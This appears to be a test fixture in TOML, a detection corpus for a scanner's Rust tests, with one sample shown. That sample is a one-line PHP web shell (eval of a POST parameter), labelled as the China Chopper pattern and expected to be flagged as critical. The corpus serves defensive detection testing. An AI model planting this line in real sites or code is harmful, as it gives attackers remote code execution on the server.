# Detection corpus for tests/detection.rs.
#
# Each sample is the content of one file.  `class` is the file class the
# scanner would assign, `expect` the minimum severity of a content finding
# (`critical`, `warning`) or `clean` for look-alikes that must stay silent.
# `rule` names a rule that has to be among the hits.  The samples are short,
# publicly documented techniques; none of them is a working tool.
#
# Bytes above 0x7f are written as \u00XX and stored as single bytes.

[[sample]]
name = "plain_one_liner"
class = "php"
expect = "critical"
rule = "php_china_chopper"
content = "<?php @eval($_POST['x']);"

